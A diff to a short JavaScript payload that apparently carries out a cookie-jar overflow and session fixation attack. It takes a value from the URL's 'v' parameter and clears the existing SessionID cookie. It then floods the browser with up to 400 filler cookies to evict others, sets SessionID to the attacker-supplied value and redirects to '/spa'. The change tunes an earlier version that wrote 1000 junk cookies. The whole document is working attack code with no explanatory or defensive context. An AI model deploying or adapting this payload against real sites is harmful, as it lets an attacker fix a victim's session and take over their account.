@@ -1,14 +1,19 @@
 (function() {
-    const targetValue = new URLSearchParams(window.location.search).get('v');
-    if (!targetValue) return;
+    const v = new URLSearchParams(location.search).get('v');
+    if (!v) return;
 
-    for (let i = 0; i < 1000; i++) {
-        document.cookie = `trash_${i}=1;path=/`;
+    const attrs = `path=/;expires=Thu, 01 Jan 2030 00:00:00 GMT${location.protocol === 'https:' ? ';secure' : ''}`;
+
+    document.cookie = `SessionID=;${attrs};max-age=0`;
+
+    const currentCount = document.cookie.split(';').filter(c => c.trim()).length;
+    const fillCount = Math.max(50, 400 - currentCount);
+
+    for (let i = 0; i < fillCount; i++) {
+        document.cookie = `t${i}=1;${attrs}`;
     }
 
-    document.cookie = `SessionID=${encodeURIComponent(targetValue)};path=/`;
+    document.cookie = `SessionID=${encodeURIComponent(v)};${attrs}`;
 
-    setTimeout(() => {
-        window.location.href = '/spa';
-    }, 200);
+    setTimeout(() => { window.location.href = '/spa'; }, 250);
 })();
